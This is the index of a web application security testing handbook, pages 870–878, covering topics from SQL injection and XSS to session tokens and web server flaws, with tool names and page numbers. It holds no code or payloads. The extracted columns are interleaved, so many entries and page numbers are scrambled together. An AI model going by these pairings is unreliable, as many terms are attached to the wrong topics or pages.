PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 870\n870 Index n Q–R\nuser input, 379–380 PL/SQL Exclusion List, Oracle, proxy services\nPayment Card Industry (PCI), 7 676–677 cross-domain data capture,\nPerl language web server software fi lter 529–531\nAPI methods bypass, 692–694 GT, 530–531\ndatabase access, 737–738 POJO. See Plain Old Java Object Jitko worm, 530–531\ndynamic code execution, 738 port scanning, Java Script, 561, public information\nfi le access, 737 566 error messages, 623\nOS command execution, 738 POST method, 43, 192 hacker’s methodology,\npotentially dangerous, purpose, 264 application mapping, 796\n736–739 POST request hidden content discovery with,\nsockets, 739 Content-Length header, 581 89–91\nURL redirection, 738 XSS converting, 474–475 Internet forums, 91\neval function, 362 PostgreSQL, 323 search engines for, 89\nOS command injection via, Pragma header, 42 web archives for, 89–90\n358–360 predictable initial passwords, published content\nsecurity confi guration, 739–740 183–184 error messages, 625\nsession interaction, 736 predictable tokens, 213–223 hidden content discovery with\nshell metacharacters, 360 Burp Intruder, 213–214 inference from, 85–89\nuser input, 735–736 concealed sequences, 213–215 information disclosure, 625\nper-page tokens, 252–253 time dependency, 215–217 PUT functions, 43\npersistent cookies, 550 weak random number PUT method, 679–680\nphishing attacks, 541, 707 generation, 218–219\nPHP testing quality, 219–223 Q\nAPI methods preg_replace function, 730\nquantity parameter,\ndatabase access, 729–730 prepared statements, 339–341\nrestricting, 128\ndynamic code execution, privacy attacks. See local privacy\nqueries\n730–731 attacks\nCGI, 735–736\nfi le access, 727–729 privilege\nconjunctive fi lters, 350\nOS command execution, 731 data stores, 287\nLDAP injection, 352–353\npotentially dangerous, DBA, 325–326\ndisjunctive fi lters, 350\n727–732 escalation\nLDAP injection, 351\nsockets, 732 horizontal, 258, 416\nparameterized\nURL redirection, 731–732 vertical, 258, 416\nprovisos, 341\neval function, 362 multilayered model\nSQL injection, 339–341\nfi le inclusion vulnerabilities, access controls security,\nsearch engines, 90\n381–382 280–283\nSELECT queries, UNION\nmail() command, 398–399 attackers, 283\noperator, 304–305\nsafe mode, 666 privs fi eld, 295\nstructure, SQL injection,\nsecurity confi guration, 732–735 proceeding to checkout,\n301–302\nmagic_quotes-gpc application logic fl aws,\ndirective, 734 410–411\nregister_globals programmatic access controls, R\ndirective, 733 282 race conditions, 427\nsafe_mode directive, PROPFIND method, 679 Rails 1.0, 55\n733–734 proxy history records, 769–771 RBAC. See role-based access\nsession interaction, 727 proxy servers. Seealso control\ntiered architectures, 653–654 intercepting proxies real-world\nuser input, 724–727 hacker’s methodology, web application logic fl aws, 406–407\nweb functionality, 54–55 servers, 847 CSRF fl aw, 505\n.php fi le extension, 108 hidden HTML form passwords, 163\nphpinfo.php, 672 modifi cation with XSS, 442–443\nping command, 364 intercepting, 119–120 recompiling, source code to\nPKC # 5 padding, 685 HTTP, 49–50 bytecode\nCBC, 686–687 HTTPS, 50 within browser,\nPlain Old Java Object (POJO), invisible, 138 142–143\n53 web servers as, 682–683 outside browser, 143\nbbiinnddeexx..iinndddd 887700 88//1199//22001111 1122::0011::3366 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 871\nIndex n S–S 871\nredirection attacks. See open CSRF, 8, 244, 504–511 deliberate backdoor, 660–661\nredirection vulnerabilities anti-CSRF tokens, 508–509, enumerating identifi ers,\nreferer-based access controls, 266 516–517 576–577\nReferrer header, 41–42 authentication, 507–508 error messages, 616–617\nclient-side data transmission, exploiting fl aws, 506–507 hacker’s toolkit custom,\n122 hacker’s methodology, 820 786–789\nFirefox, 239 preventing fl aws, 508–510 Curl, 788\nXSS exploiting via, 475–476 real-world fl aws, 505 Netcat, 788–789\nrefl ected XSS, 434–438 session management, 251 Stunnel, 789\nApache, 442 XSS defeating anti-CSRF Wget, 788\ncookies, 437–438 tokens, 510–511 HTML form validation,\ndelivering, 448–449 OSRF, 502–503 129–131\nDOM XSS converted from, request headers, 45–46 injection\n472–473 “request in browser,” Burp Suite, hacker’s methodology, 835\nexploiting, 435–438, 474 272–273 preventing vulnerabilities,\nfi lters request macros, Burp Suite, 368\ndefensive, 455–456 604–606 refl ected XSS user input testing\nsanitizing, 468–471 response headers, 46 to introduce, 454–455\nsignature-based, 455–456 REST. See representational state session token attacker, 217\nfi nding and exploiting, 452–481 transfer script code\nhacker’s methodology, 829–830 reverse strokejacking, 560 bypassing fi lters, 465–468\nIE, 435 rickrolling attacks, 541 dot character alternatives,\nlength limits, 471–473 Rios, Billy, 485 466\npreventing, 492–496 robots.txt, 74 dynamically constructed\nHTML limitations, 495–496 role-based access control strings, 466\ninput insertion, 495 (RBAC), 282 encoding, 468\ninput validation, 492–493 rolling your own insurance, eval function alternatives,\noutput validation, 493–495 application logic fl aws, 466\n“remember me” function, 437 412–413 JavaScript escaping, 465–466\nsteps, 436–437 Ruby on Rails (Ruby), 55 multiple technique\nstored XSS compared to, WEBrick, 690 combination, 466–467\n439–440 VBScript, 467\nuser input testing, 453 S VBScript and JavaScript,\nscript introduction, 454–455 467–468\nsafe data handling approach,\nregister_globals directive, HTML introducing\ninput, 25\n733 dynamically evaluated CSS\n“safe for scripting” registration,\n“reject known bad” approach, styles, 459\nActiveX controls, 555–557\ninput, 23–24 event handlers, 457–458\nsafe_mode directive, 733–734\nRemembeMe cookie, 407–408 script pseudo-protocols, 458\nsame-origin policy, 524–525\n“remember me” functions scripttags, 457\nbrowser extensions, 525–527\napplication logic fl aws, script pseudo-protocols, 458\nFlash, 525–526\nencryption oracle, 407 search engines\nJava, 527\nauthentication, 175–176, 193 error messages, 623\nSilverlight, 526–527\nhacker’s methodology, 808 inference, 626\nhacker’s methodology, 851–852\ncookies, 175–176 public information, 89\nHTML5, 528–529\nencrypting, 177 queries, 90\nweb functionality, 64\nrefl ected XSS, 437 search function\nsanitization approach, input,\nremote attackers, 427 application logic fl aws, 422–\n24–25\nremote black-box testing, 427 424, 429\nremote fi le inclusion, 381–382 sanitizing fi lters, 468–471 stored XSS, 439\nfl aw testing, 383 scanning. See vulnerability SEARCH method, 679\nremoting, 70 scanners secondary challenge\nrepresentational state transfer Schuh, Justin, 634 login function, 173, 200\n(REST), URLs, 44–45 ScreenName cookie, 407–408 password recovery, 200\nspidering, 74–75 scripts. Seealso cross-site second-order SQL injection,\nrequest forgery scripting 313–314\nbbiinnddeexx..iinndddd 887711 88//1199//22001111 1122::0011::3377 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 872\n872 Index n S–S\nsecond-order XSS. See stored XSS reputation, 1 ASP.NET, 54, 103\nsecret questions, login function, session management, 248–254 dissecting requests, 107–108\n189 shared hosting, 665–667 Java, 53–54\nSecure Socket Layer (SSL) component segregation, 667 PHP, 54–55\nclient-side certifi cation, 138 customer access, 665–666 Ruby on Rails, 55\ncommunication protection, 192 customer functionality SQL, 55–56\nhacker’s methodology check segregation, 666 web application behavior\nfor weak ciphers, 851 SSL, 7–8 extrapolation, 109–110\nHTTP tunneled over, 49 tiered architectures, 654–656 web application behavior\nsecurity, 7–8 time and resources impacting, isolation, 110\nsession tokens, 233 11 web services, 56–57\nvulnerabilities of, 8 token generation, 210 XML, 56\nsecurity. Seealso defense underdeveloped awareness HTTP redirection, 390–392\nmechanisms of, 10 exploiting, 391–392\naccess controls, 278–283 web application, 1, 6–15 technologies\nbest practices, 279–280 attackers, 6 application mapping\ncentral component approach, developer understanding, 3 identifying, 101–106\n280 future, 14–15 banner grabbing, 101\nmultilayered privilege key factors, 10–12 directory names, 105\nmodel, 280–283 new network perimeter for, fi le extensions, 102–105\npitfalls, 278–279 12–14 HTTP fi ngerprinting, 102\napplication logic fl aws, 428 user input threatening, 9–10 session tokens, 105\nASP.NET vulnerabilities, 7–8 third-party code\nconfi guration, 723–724 web server components, 105\nViewState, 155 confi guration, 684 sessions\nASPs, 665–667 software, 695–697 ASP.NET, 719–720\ncomponent segregation, 667 website evolution and, 2 fi xation\ncustomer access, 665–666 XSS, evolution, 433 cookie injection, 537–540\ncustomer functionality SELECT NULL value, UNION fi nding and exploiting,\nsegregation, 666 operator, 306–307 539–540\nauthentication, 191–201 SELECT queries, UNION operator, preventing, 540\nbrute-force attack prevention, 304–305 steps, 537–538\n196–199 SELECT statements hacker’s methodology\nsubtleties, 195 SQL injection, 294–295 fi xation, 819\nclient-side, 431–432 WHERE clause, 321 terminating, 818–819\nclient-side data transmission, self-registration, usernames, hacker’s methodology,\n154–156 182, 196 application mapping,\nlogging and alerting, 156 semantic checks, input, 25 tokens to, 818\nvalidation, 155 semicolon character, batch hijacking, 436\nevolution, 432 function, 363 HTTP authentication\nhardening, 695–696 serialization, 70 alternative to, 208–209\nHTTP headers and serialized data Java, 712–713\nassumptions with, 123 browser extensions Perl language, 736\nJava confi guration, 716–717 intercepting data PHP, 727\nmedia focus on, 432 transmission, handling, standalone vulnerability\nMicrosoft, 431–432 136–138 scanners handling,\nmyths, 433 Java, 136–137 778–779\nPCI standards, 7 Flash, 137–138 state information managed\nPerl language confi guration, Silverlight, 138 without, 209\n739–740 server error messages, 619–622 termination, 241–243\nPHP confi guration, 732–735 Server header, 42 reactive, 253–254\nmagic_quotes-gpc server-executable fi les, 382 web functionality, 66\ndirective, 734 servers. See web servers session management. Seealso\nregister_globals server-side access controls\ndirective, 733 API redirection, 392 alerts, 253\nsafe_mode directive, functionality application logic fl aws, 429\n733–734 application mapping attackers, 20\nquestions, 650 identifying, 106–110 cookies, liberal scope, 244–248\nbbiinnddeexx..iinndddd 887722 88//1199//22001111 1122::0011::3377 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 873\nIndex n S–S 873\nCSRF, 251 session riding. See request simple match conditions fi lter,\ndefense mechanisms handling forgery 350\naccess with, 19–20 session-handling mechanisms Simple Object Access Protocol\nduration, 241–243 Burp Suite (SOAP), 57\nhacker’s methodology cookie jar, 603–604 functions, 386\ntoken insecure transmission, request macros, 604–606 injection, 386–388\n817 session-handling rules, banking application, 387–388\ntoken system log disclosure, 606–609 error messages, 388\n817–818 session-handling tracer, 609 fi nding and exploiting, 389\ntokens tested for meaning, supporting, 603–609 hacker’s methodology, 839\n815–816 customized automation, preventing, 27, 390\ntokens tested for 602–609 NBFS, 138\npredictability, 816–817 session-handling rules, 606–609 site map records, 769–771\nunderstanding, 814–815 session-handling tracer, 609 SiteLock Active Template\nlogging, 253 SessionID parameter, 590 Library, Microsoft, 559\nlogin function, 206 Set-Cookie header, 42, 47, 242, sleep function, MySQL, 323\nlogout function, 242, 250 244–245, 531 smartcards, authentication, 206\nmonitoring, 253 enumerating identifi ers, 575 SMTP injection, 397–402\nsecurity, 248–254 setString method, 340 fl aws, 400–401\nstate information, 206–209 shared hosting, 656–657. Seealso hacker’s methodology, 836–837\ntokens cloud computing preventing, 402\nalgorithm generating, 249 attackers, 658–665 sniper attack, Burp Intruder, 592\nattacker scripts, 217 access, 658–660 SOAP. See Simple Object Access\nclient-side exposure to deliberate backdoor scripts, Protocol\nhijacking of, 243–244 660–661 sockets\nconcealed sequences, 213–215 between web applications, ASP.NET API methods,\neavesdroppers, 234 660–663 723\nencrypting, 223–233 hacker’s methodology, 845–846 Java, 716\nHTTP cookies, 207–208, securing, 665–667 Perl language API methods,\n234–236 component segregation, 667 739\nHTTPS, 234–236, 250 customer access, 665–666 PHP API methods, 732\nlife cycle protection, 250–253 customer functionality source code\nlogin function, 539–540 segregation, 666 application logic fl aws, 428\nmeaningful, 210–212 threats, 657 backdoor password, 708\nnetwork disclosure, 234–237 virtual hosting, 657 browsing, 743\nper-page, 252–253 shared token analyzers, buffer overfl ow, 709\npredictable, 213–223 integrated testing suites, 767 bytecode recompiling\nserver-side technology, 105 shared usernames, 181 within browser, 142–143\nSSL, 233 shell metacharacters, 359–360 outside browser, 143\nstrength, 248–249 application logic fl aws, 419 comments, 710–711\nsystem log disclosure, OS command injection, 363, decompiling browser\n237–239 365 extensions, 142–144\ntime dependency, 215–217 Perl language, 360 error messages, 623\ntransmitting, 538 types, 363 format string vulnerabilities,\nURL transmission, 250 TheShellcoder’sHandbook (Anley 710\nin URLs, 237–238 & Heasman & Linder), 634 integer vulnerabilities, 709–710\nvulnerable mapping of, Shift-JIS character set, 464–465 native software bugs, 709–710\n240–241 shutdown command, 315 open redirection\nweak random number signature-based fi lters, refl ected vulnerabilities, 707–708\ngeneration, 218–219 XSS, 456–457 OS command injection, 708\nweak random number signedness errors, 641–642 path traversal vulnerabilities,\nquality testing, 219–223 Silverlight, 135 706–707\nweakness in generating, bytecode, 141 review\n210–233 debuggers, 152 approaches, 702–704\nweakness in handling, Isolated Storage, 553 black-box versus white-box,\n233–248 same-origin policy, 526–527 702–703\nXSS vulnerabilities, 243–244 serialized data, 138 methodology, 703–704\nuses, 205 Spy, 152 situations, 701\nbbiinnddeexx..iinndddd 887733 88//1199//22001111 1122::0011::3377 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 874\n874 Index n T–T\nsignatures of common enumerating identifi ers, 574 fi ngerprinting databases,\nvulnerabilities, 704–711 storage. See web storage, cloud 303–304\nSQL injection, 705–706 computing hacker’s methodology,\nXSS, 704–705 stored procedures 827–829\nspidering databases, 339 inference, 319–324\nREST URLs, 74–75 hacker’s methodology, 831–832 input validation\nuser-directed, 77–80 stored XSS, 438–440 circumvented, 312\nbenefi ts, 77 attacker steps, 438–439 INSERT statements, 295–296\nhidden content discovery delivering, 449–450 JavaScript errors, 299\nwith, 81–83 e-mail testing, 483–484 numeric data, 299–301,\nweb compared to, 79 fi nding and exploiting, 481–487 315–316\nweb, 74–77 MySpace, 442–443, 446 ORDER BY clause, 301–302\nauthentication, 76 preventing, 492–496 out-of-band channel, 316–319\nintegrated testing suites, HTML limitations, 495–496 parameterized queries,\n760–762 input insertion, 495 339–341\nuser-directed spidering input validation, 492–493 preventing, 27, 338–342\ncompared to, 79 output validation, 493–495 query structure, 301–302\nSQL. See Structured Query refl ected XSS compared to, second-order, 313–314\nLanguage 439–440 SELECT statements, 294–295\nSQLMap, 322 search function, 439 source code, 705–706\nsql-shell option, 330–331 uploaded fi les testing, 484–487 string data, 298–299\nSQLzoo.net, 292 Ajax, 486–487 syntax, 332–334\nSSL. See Secure Socket Layer GIFAR fi les, 485–486 time delays, 322–324\nstack overfl ows, 634–635 string data UNION operator, 304–308\nstack traces dynamically constructed, UNION operator data\nASP.NET, 617 script code bypassing extraction, 308–311\nerror messages, 617–618 fi lters, 466 UPDATE statements, 296–297\nstandalone vulnerability manipulation, 316 URL encoding, 300–301\nscanners, 773–784 SQL injection into, 298–299 vulnerability exploitation,\nautomated versus user- string-length() function, 292–294\ndirected, 784 348 web functionality, 55–56\ncustomized automation, strncpy function, 642 structured tokens, 210–212\n780–781 strokejacking, 511. Seealso user Stunnel, 789\ndangerous effects, 779 interface redress attacks SUBSTR(ING) functions, 324\nindividuating functionality, reverse, 560 suspension of account, 197–198\n779–780 Structured Query Language .swf fi les, 141\nlimitations, 776–777 (SQL) syntactic validation, 25\nproducts, 781–782 client-side injection, 547–548\nsystem log disclosure\ntechnical challenges, 778–781 comments, 312\nhacker’s methodology, session\nauthentication and session injection, 7, 14\nmanagement, 817–818\nhandling, 778–779 advanced exploitation,\nsession tokens, 237–239\nusing, 783–784 314–324\nvulnerabilities, 238\nvulnerabilities detected, API methods, 291\n774–776 application logic fl aws,\nT\nvulnerabilities undetected, 775 420–422\nstate information blind, 626 tag brackets, HTML bypassing\nsession management, 206–209 bugs, 298–302 fi lters, 462–464\nwithout sessions, 209 client-side, 547–548 tag name, HTML bypassing\nweb functionality, 66 column name, 301–302 fi lters, 460–461\nstatic resources conditional errors, 320–322 scripttags, 457\naccess controls, 263–264 database code components, Tamper Data, 772\naccount testing, 277 741–742 TamperIE, 772–773\nfi le inclusion, 382 defense in depth, 342 TCP protocol, HTTP using, 40\nnaming schemes, 87 DELETE statements, 297–298 testing. See account testing;\nstatic tokens, 240 double hyphen, 293 hacker’s methodology;\nstatistical hypothesis testing, error messages, 334–338 hacker’s toolkit; statistical\n219–222 exploitation tools, 328–331 hypothesis testing\nstatus codes, HTTP, 48–49 fi lter bypassing, 311–313 third-party applications, 560–561\nbbiinnddeexx..iinndddd 887744 88//1199//22001111 1122::0011::3377 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 875\nIndex n U–U 875\n301 Moved Permanently, 48 insecure transmission, 817 access, 649\n302 Found, 48 system log disclosure, exploiting, 649–650\nbrute-force techniques, 84 817–818 minimize, 654–655\n304 Not Modified, 48 tested for meaning, 815–816 XSS attack payloads exploiting,\ntiered architectures, 647 tested for predictability, 446–447\nattacks, 648–654 816–817 try-catch blocks, 30\ncategories, 648–649 per-page, 252–253 200 OK, 48\ncomponent segregation, session management 201 Created, 48\n655–656 algorithm generating, 249\ndefense in depth, 656 attacker scripts, 217 U\nJava, 648 client-side exposure to\nUDFs. See user-defi ned functions\nlayers, 648 hijacking of, 243–244\nUI redress attacks. See user\nPHP, 653–654 concealed sequences, 213–215\ninterface redress attacks\nsecuring, 654–656 eavesdroppers, 234\nuid parameter, 584, 590\nsubverting, 650–654 encrypting, 223–233\nunhandled errors, 30–31\ndecryption algorithms, 650 HTTP cookies for, 207–208,\nUnicode encoding, 67–68\nlocal fi le inclusion executing 234–236\nBurp Intruder, 375\ncommands, 652–654 HTTPS, 234–236, 250\nuniform resource identifi er\nMySQL extraction, 650–652 life cycle protection, 250–253\n(URI), 44\ntrust relationships, 649–650 login function, 539–540\nopen redirection\naccess, 649 meaningful, 210–212\nvulnerabilities, absolute\nminimize, 654–655 network disclosure, 234–237\nprefi x, 545–546\ntime per-page, 252–253\nuniform resource locator (URL)\ndelays predictable, 213–223\naccount activation, 184\nenumerating identifi ers, security, generation of, 210\napplication mapping, input\n575–576 server-side technologies, 105\nentry points, 98–99\nOracle databases, 323–324 strength, 248–249\nbuffer overfl ow and length\nOS command injection, system log disclosure,\nof, 639\n363–364 237–239\nbytecode, 140\nSQL injection, 322–324 transmitting, 538\nencoding, 67\nsession token generation, URL transmission, 250\nSQL injection, 300–301\n215–217 in URLs, 237–238\ntruncating, 378\ntime of check, time of use fl aw vulnerable mapping of,\nformat, 44\n(TOCTOU fl aw), 505 240–241\nHTTP requests, 40, 44\nTOCTOU fl aw. See time of check, weakness in generating,\nopen redirection\ntime of use fl aw 210–233\nvulnerabilities, 542\ntokens weakness in handling,\nabsolute prefi x, 545–546\nanti-CSRF, 508–509 233–248\nblocking absolute, 544–545\nXSS defeating, 510–511 XSS vulnerabilities, 243–244\nparameters, client-side data\nauthentication, 160 shared analyzers, integrated\ntransmission, 121–122\nBurp Sequencer testing testing suites, 767\npasswords recovery with time-\nrandomness of, 219–221 SSL, 233\nlimited, 174–175\ncloud computing attackers, 665 static, 240\nredirection\nencrypting, 223–233 structured, 210–212\nASP.NET API methods, 723\nattackers, 232–233 time dependency, 215–217\nBurp Intruder bit fl ipper, weak random number Java API methods, 716\n228–231 generation, 218–219 Perl language API methods,\nCBC, 227–233 weak random number quality 738\ndownloading, 231–232 testing, 219–223 PHP API methods, 731–732\nECB ciphers, 224–226 TRACE functions, 43 REST, 44–45\n“reveal” encryption oracle, transaction logic, 844 spidering, 74–75\n232 Trojan injection, XSS attack session tokens, 237–238, 250\ngenerating strong, 248–249 payloads, 444–445 translation attacks, 396–397\nhacker’s methodology, trust relationships UNION operator\napplication mapping, hacker’s methodology, Boolean conditions, 329\nsessions to, 818 application logic fl aws, error messages, 306\nhacker’s methodology, session 844 NULL value, 306–307\nmanagement tiered architectures Oracle databases, 307–308\nbbiinnddeexx..iinndddd 887755 88//1199//22001111 1122::0011::3377 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 876\n876 Index n V–W\nprovisos, 305–306 web spidering compared to, 79 hacker’s methodology, web\nSELECT NULL value, 306–307 _username buffer, 635–637 servers, 847–848\nSELECT queries, 304–305 usernames shared hosting, 657\nSQL injection, 304–308 access controls attackers web servers misconfi gured,\ndata extraction, 308–311 harvesting, 275–276 683\nUNIX attackers, 168 virtual machines (VMs), 145\nchrooted fi le system, 381 e-mail address, 167, 196 sandbox, 153\nWindows path traversal enumeration, 166–169 virtual private network (VPN),\nvulnerabilities compared hacker’s methodology, 659\nto, 374 authentication VMs. See virtual machines\nUPDATE statements, 296–297 enumerating, 806–807 VPN. See virtual private network\nuploaded fi les, stored XSS uniqueness, 809 vulnerability scanners\ntesting, 484–487 nonunique, 181–182 integrated testing suites,\nAjax, 486–487 password change functionality, 764–765\nGIFAR fi les, 485–486 172 standalone, 773–784\nURI. See uniform resource predictable, 182–183, 197 standalone, 773–784\nidentifi er self-registration, 182, 196 automated versus user-\nURL. See uniform resource shared, 181 directed, 784\nlocator sources, 169 customized automation,\nUS-ASCII, 464 system-generated, 192 780–781\nuser access. See access UTF-7, 464 dangerous effects, 779\nuser input. Seealso input UTF-16, 464–465 individuating functionality,\nASP.NET API methods for, UTL-HTTP package, 317–318 779–780\n718–719 limitations, 776–777\nclient-side controls, 117 V products, 781–782\nbrowser extensions, 133–153 technical challenges, 778–781\nValidateForm function, 130\nhacker’s methodology, using, 783–784\nVALUES clause, 295–296\n801–802 vulnerabilities detected,\nvariable assignment, JavaScript\nHTML forms, 127–133 774–776\nhijacking, 522\nJava, 711–712 vulnerabilities undetected,\nVBScript\nAPI methods, 712 775\nerror messages, 616\nopen redirection\nscript code bypassing fi lters,\nvulnerabilities, 543–544 467 W\npath traversal vulnerabilities,\nJavaScript with, 467–468 WAFs. See web application\n379–380\nweb functionality, 61 fi rewalls\nPerl language, 735–736\nvendor patches, web servers, 695 WAITFOR command, MS-SQL,\nPHP, 724–727\nverbose debugger messages, 425 322–323\nrefl ected XSS testing, 453\nverbose error message, 30–31, WAR fi les, 673–676\nscript introduction, 454–455\n624 warez, distributing, 2\nweb application security\nthreatened by, 9–10 verbose failure messages, WayBack Machine, 89\nuser interface redress attacks (UI 166–169 WCF. See Windows\nredress attacks), 508, 511–515 vertical access controls, 258 Communication Foundation\nbasic form, 511–513 vertical privilege escalation, weak passwords, 161–162\nframebusting, 514–515 258, 416 web 2.0, 14\nmobile devices, 515 ViewState, ASP.NET vulnerabilities, 65\npreventing, 515 attackers, 127 web application fi rewalls (WAFs)\nvariations, 513 Base64 encoding, 125–126 bypassing, 698\nUser-Agent header, 41, 52 Burp Suite, 126 hacker’s methodology, web\ntargeting, 100 client-side data transmission, servers, 848–849\nuserData, IE, 554 124–127 NULL bytes, 460\nuser-defi ned functions (UDFs), purpose, 125 web servers, 697–698\n328 security, 155 web applications. Seealso\nuser-directed spidering, 77–80 virtual defacement, XSS attack hacker’s methodology;\nbenefi ts, 77 payloads, 443–444 hacker’s toolkit\nhidden content discovery with, virtual hosting administrative functions in,\n81–83 Apache, 683 35–36\nbbiinnddeexx..iinndddd 887766 88//1199//22001111 1122::0011::3377 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 877\nIndex n W–W 877\nASP attackers between, XSS fi lters, 479–481 misconfi gured virtual hosting,\n660–663 web container, Java, 53 683\nbehavior web functionality Oracle, 676–677\nextrapolating, 109–110 client-side, 57–65 as proxy servers, 682–683\nisolating, 110 Ajax, 62–63, 384 software\nbenefi ts, 5–6 browser extension Allaire JRun, 690–691\nbusiness, 4 technologies, 65 Apple iDisk Server, 690\ncloud computing, 5 CSS, 60–61 defense in depth, 696–697\ncustom development, 10 DOM, 62 encoding and\ndata store reliance of, 287 forms, 58–60 canonicalization,\ndeceptive simplicity, 10–11 HTML, 58 689–694\nevolution, 2–3 HTML5, 64–65 JVM, 690\nframework fl aws, 685–687 hyperlinks, 58 memory management,\nfunctions, 4–5 JavaScript, 61 687–689\nincreasing demands on, 12 JSON, 63 Microsoft IIS path traversal\nmanaging, 35–36 same-origin policy, 64 vulnerabilities, 691–692\noverextended, 11–12 VBScript, 61 Oracle PL/SQL Exclusion\npages, functional paths versus, server-side, 51–57, 103, 106–110 List fi lter bypass,\n93–96 ASP.NET, 54, 103 692–694\nsecurity, 1, 6–15 Java, 53–54 resources, 694\nattackers, 6 PHP, 54–55 Ruby WEBrick, 690\ndeveloper understanding, 3 Ruby on Rails, 55 securing, 695–697\nfuture, 14–15 SQL, 55–56 security hardening, 695–696\nkey factors, 10–12 web services, 56–57 vendor patches, 695\nnew network perimeter for, XML, 56 vulnerabilities, 684–697\n12–14 sessions, 66 vulnerabilities, 91–92\nuser input threatening, 9–10 state information, 66 WAFs, 697–698\nvulnerabilities, 7–8 web servers, 669–670 WebDAV methods, 679–681\nshared hosting attackers CMS, 92 web services, 56–57\nbetween, 660–663 confi guration Web Services Description\ntechnologies developing, 6 security, 684 Language (WSDL), 57\nthird-party, 560–561 vulnerabilities, 670–684 web spidering, 74–77\nthreats to, 3 default content, 92, 671–677 authentication, 76\nrapidly evolving, 11 debug functionality, 671–672 integrated testing suites,\nXPath subverting logic of, hacker’s methodology, 847 760–762\n345–346 JMX, 674–676 user-directed spidering\nweb archives, public powerful functions, 673–674 compared to, 79\ninformation, 89–90 sample functionality, 672–673 web storage\nweb browsers. Seealso browser default credentials, 670–671 cloud computing, 665\nextensions; Firefox; Internet hacker’s methodology, 846 hacker’s methodology,\nExplorer directory listing, 677–679 authentication insecure,\nattackers, 559–568 Allaire JRun, 690–691 811\nbrowsing history, 552 fl aws, 694 Web-based Distributed\nbugs, 563 hacker’s methodology, 846–849 Authoring and Versioning\ncapabilities, 5–6 dangerous HTTP methods, (WebDAV)\nDNS rebinding, 563–564 847 overfl ows, 689\nexploitation frameworks, default content, 847 web server methods, 679–681\n564–566 default credentials, 846 WebDAV. See Web-based\nBeEF, 565–566 native software bugs, 848 Distributed Authoring and\nXSS Shell, 566 proxy server functionality, Versioning\nhacker’s toolkit, 748–750 847 WEBrick, Ruby, 690\nChrome, 750 virtual hosting, 847–848 websites\nFirefox, 749–750 WAFs, 848–849 attacker-created, 448–449\nIE, 748–749 hidden content discovery evolution, 51\nintegrated testing suites, leveraging, 91–93 security and evolution of, 2\nintercepting proxies JBoss Application Server, web.xml fi le, 716–717\nconfi guring, 752–755 674–676 Wget, 788\nbbiinnddeexx..iinndddd 887777 88//1199//22001111 1122::0011::3377 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 878\n878 Index n X–Z\nWHERE clause evolution, 2–3, 15 hacker’s methodology,\nDELETE statements, 297–298 overextended technologies in, 840–841\nINSERT statements, 295 11–12 informed, 346–347\nSELECT statements, 321 WSDL. See Web Services preventing, 349\nUPDATE statements, 296–297 Description Language keywords, 346\nwhite-box code review, 702–703 string-length() function,\nwhitelist-based fi lters, 24 X 348\nwiki, brute-force techniques for .xap fi les, 141 subverting web application\npasswords in, 424 X-Frame-Options header, logic, 345–346\nWikto, hidden content, 515 XMLHttpRequest, 62–63, 476,\n92–93 XHTML, 58 524\nattackers, 529\nWindows, UNIX path traversal XML. See Extensible Markup\ncross-domain requests,\nvulnerabilities compared Language\n528–529\nto, 374 XML external entity injection\nXPath. See XML Path Language\nWindows Communication (XXE injection), 384–386\nXSS. See cross-site scripting\nFoundation (WCF), 138 hacker’s methodology,\nXSS Shell, 566\nWinter-Smith, Peter, 640 841\nXXE injection. See XML external\nWireshark, 236 XML Path Language (XPath)\nentity injection\nWitko, 785 count() function, 348\nWorld Wide Web. Seealso injection, 344–349\nhypertext transfer protocol; blind, 347–348 Z\nweb functionality fl aws, 348–349 .zip extension, 141\nbbiinnddeexx..iinndddd 887788 88//1199//22001111 1122::0011::3377 PPMM"
  }
]